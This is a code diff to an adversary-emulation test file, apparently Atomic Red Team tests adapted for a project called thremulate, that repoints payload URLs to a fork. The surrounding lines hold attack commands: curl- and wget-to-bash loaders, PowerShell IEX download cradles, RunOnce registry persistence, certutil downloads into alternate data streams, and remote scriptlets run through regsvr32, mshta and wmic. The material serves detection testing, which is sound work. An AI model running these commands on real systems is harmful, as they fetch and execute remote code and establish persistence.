@@ -936,7 +936,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -960,7 +960,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -988,7 +988,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -3963,7 +3963,7 @@ persistence:
         name: powershell
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 
 '
@@ -5632,7 +5632,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -5656,7 +5656,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -5684,7 +5684,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -6417,7 +6417,7 @@ defense-evasion:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -9886,7 +9886,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -9930,7 +9930,7 @@ defense-evasion:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1170/src/T1170.hta
         temp_file:
           description: temp_file location for hta
           type: string
@@ -10045,7 +10045,7 @@ defense-evasion:
           type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
+          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1096/src/test.ps1 c:\temp:ttt
           makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
           print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
           reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
@@ -11119,7 +11119,7 @@ defense-evasion:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1117/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -11335,7 +11335,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -11850,7 +11850,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -12529,11 +12529,11 @@ defense-evasion:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -12575,7 +12575,7 @@ defense-evasion:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
@@ -16773,7 +16773,7 @@ discovery:
         input_url:
           description: URL to source code in Atomic-Red-Team git repository
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1010/src/T1010.cs
         input_source_code:
           description: Path to source of C# code
           type: path
@@ -21308,8 +21308,8 @@ execution:
       executor:
         name: sh
         command: |
-          bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-          bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+          bash -c "curl -sS https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1059/echo-art-fish.sh | bash"
+          bash -c "wget --quiet -O - https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/Atomics/T1059/echo-art-fish.sh | bash"
   T1223:
     technique:
       x_mitre_data_sources:
@@ -21401,7 +21401,7 @@ execution:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -22111,7 +22111,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -22155,7 +22155,7 @@ execution:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1170/src/T1170.hta
         temp_file:
           description: temp_file location for hta
           type: string
@@ -22382,7 +22382,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1086/payloads/test.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -22402,7 +22402,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1086/payloads/test.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -22421,7 +22421,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1086/payloads/test.xml
       executor:
         name: command_prompt
         elevation_required: false
@@ -22440,7 +22440,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1086/payloads/mshta.sct
       executor:
         name: powershell
         elevation_required: false
@@ -22731,7 +22731,7 @@ execution:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1117/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -22826,7 +22826,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -23619,7 +23619,7 @@ execution:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -24460,11 +24460,11 @@ execution:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -24506,7 +24506,7 @@ execution:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
@@ -25336,7 +25336,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -25358,7 +25358,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -25386,7 +25386,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -25407,7 +25407,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -26065,7 +26065,7 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1074/src/Discovery.bat'')
           > pi.log
 
 '
@@ -26079,7 +26079,7 @@ collection:
       - macos
       executor:
         name: bash
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
 '
@@ -27616,7 +27616,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -27638,7 +27638,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -27666,7 +27666,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -27687,7 +27687,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
